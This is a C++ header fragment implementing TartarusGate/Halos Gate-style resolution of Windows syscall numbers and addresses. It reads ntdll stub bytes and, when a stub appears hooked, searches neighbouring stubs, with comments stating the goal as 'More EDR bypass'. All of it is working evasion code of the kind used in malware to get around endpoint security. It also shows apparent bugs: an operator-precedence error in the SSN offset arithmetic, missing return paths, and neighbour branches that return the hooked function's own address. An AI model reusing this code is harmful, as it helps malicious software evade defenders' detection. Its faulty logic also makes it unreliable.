#ifdef GETSYSCALL_SORT_TARTARUS
// from <https://github.com/reveng007/DarkWidow/blob/main/src/SyscallStuff.h>

#define UP -32
#define DOWN 32

#include <iostream>
#include <windows.h>

WORD GetSyscallNum(LPVOID ntapiaddr)
{
  std::cout << "[+] starting SSN sort on the function address: " << ntapiaddr << "\n";
	WORD SystemCall = NULL;

	// Whole SystemCall Stub:
	// First Opcode should be: (If Not Hooked)
	// mov r10, rcx
	// mov rcx, SSN
	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		BYTE high = *((PBYTE)ntapiaddr + 5);
		BYTE low = *((PBYTE)ntapiaddr + 4);
		SystemCall = (high << 8) | low;

    std::cout << "[+] got clean SSN: " << SystemCall << "\n";

		return SystemCall;
	}

	// if (*((PBYTE)ntapiaddr) == 0xe9)	

	// If Hooked: jmp <instructions>
	// opcode: \xe9...

	// Why So Many Checking of Jumps???
	//
	// 1. Hell's Gate or Modified Hells Gate, Halos Gate: Only Checks if first instruction is a JMP
	// 
	// 2. Modified Halos Gate, TartarusGate: Only Checks if first or third instruction is a JMP
	// 
	// 3. These Combination is again Modified from TartarusGate: Checks if first, third, eighth, tenth, twelveth instruction is a JMP
	// 
	// => More EDR bypass -> More EDR, More Diverse ways of hooking APIs 
	// 
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{

				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * DOWN);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * DOWN);
				SystemCall = (high << 8) | low - idx;

        std::cout << "[+] [neighbouring: DOWN] SSN: " << SystemCall << "\n";

				return SystemCall;
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * UP);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * UP);
				SystemCall = (high << 8) | low + idx;

        std::cout << "[+] [neighbouring: UP] SSN: " << SystemCall << "\n";

				return SystemCall;
			}
		}
	}
}

// Sektor7: HalosGate -> hellsgate.asm
DWORD64 GetSyscallAddr(LPVOID ntapiaddr)
{
  std::cout << "[+] Trying to get a clean address (*gate) from the function address: " << ntapiaddr << "\n";
	WORD SystemCall = NULL;

	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		// https://github.com/reveng007/MaldevTechniques/tree/main/3.Evasions/SSN_Sort_patch_Hooked_syscalls/project_vs_2022#to-get-syscall-instuction-calculation
    INT_PTR addr = (INT_PTR)ntapiaddr + 0x12;
    std::cout << "[+] got clean address: " << addr << "\n";
		return addr;
	}

	// if (*((PBYTE)ntapiaddr) == 0xe9)	

	// If Hooked: jmp <instructions>
	// opcode: \xe9...

	// Why So Many Checking of Jumps???
	//
	// 1. Hell's Gate or Modified Hells Gate, Halos Gate: Only Checks if first instruction is a JMP
	// 
	// 2. Modified Halos Gate, TartarusGate: Only Checks if first or third instruction is a JMP
	// 
	// 3. These Combination is again Modified from TartarusGate: Checks if first, third, eighth, tenth, twelveth instruction is a JMP
	// 
	// => More EDR bypass -> More EDR, More Diverse ways of hooking APIs 
	// 
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{
        INT_PTR addr = (INT_PTR)ntapiaddr + 0x12;
        std::cout << "[+] got clean address: " << addr << "\n";
        return addr;
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
        INT_PTR addr = (INT_PTR)ntapiaddr + 0x12;
        std::cout << "[+] got clean address: " << addr << "\n";
        return addr;
			}
		}
	}
}

#endif
